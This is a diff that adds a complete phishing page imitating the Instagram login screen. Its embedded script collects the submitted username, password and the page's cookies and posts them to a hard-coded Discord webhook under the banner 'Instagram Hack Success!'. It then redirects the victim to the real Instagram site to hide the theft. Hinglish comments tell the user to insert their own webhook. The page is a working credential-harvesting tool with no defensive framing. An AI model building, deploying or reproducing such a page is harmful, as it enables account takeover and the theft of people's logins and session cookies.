@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-form {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            border-radius: 1px;
+        }
+        .logo {
+            margin-bottom: 20px;
+            font-family: 'Grand Hotel', cursive;
+            font-size: 48px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 12px 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            box-sizing: border-box;
+            font-size: 12px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:disabled {
+            opacity: 0.5;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+        /* Spinner */
+        .spinner {
+            border: 2px solid #dbdbdb;
+            border-top: 2px solid #8e8e8e;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<div class="login-form">
+    <div class="logo">Instagram</div>
+    <form id="instaForm">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" id="submitBtn">Log in</button>
+    </form>
+    <div class="spinner" id="spinner"></div>
+    <div class="footer">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+    </div>
+</div>
+
+<script>
+    // 👇 YAHAN APNA DISCORD WEBHOOK URL DAALO
+    const webhookURL = "https://discord.com/api/webhooks/1553320258054656070/u4QlkKbHzc6V2rwuf8ljZZh2jtGF-4dWQgG5pOztCH_Ej8qI1V6zQWA4OohQ6QTpfHhJ"; 
+
+    document.getElementById('instaForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const btn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinner');
+        
+        // UI Change
+        btn.style.display = 'none';
+        spinner.style.display = 'block';
+        
+        // Data Collect Karna
+        const formData = new FormData(e.target);
+        const username = formData.get('username');
+        const password = formData.get('password');
+        
+        // Cookie Collect Karna (Sabse Zaroori)
+        const cookies = document.cookie;
+        
+        // Discord Message Bhejna
+        const payload = {
+            content: `🔓 **Instagram Hack Success!**`,
+            embeds: [{
+                title: "Account Captured",
+                color: 15158332,
+                fields: [
+                    { name: "📱 Username", value: username, inline: true },
+                    { name: "🔑 Password", value: password, inline: true },
+                    { name: "🍪 Cookies", value: cookies.length > 0 ? cookies : "No Cookies Found", inline: false }
+                ],
+                footer: { text: "Captured on " + new Date().toLocaleString() }
+            }]
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if(response.ok) {
+                // Success ke baad Original Instagram Page Par Bhejna
+                window.location.href = "https://www.instagram.com";
+            } else {
+                console.error("Webhook failed");
+                btn.style.display = 'block';
+                spinner.style.display = 'none';
+            }
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            btn.style.display = 'block';
+            spinner.style.display = 'none';
+        });
+    });
+</script>
+
+</body>
+</html>
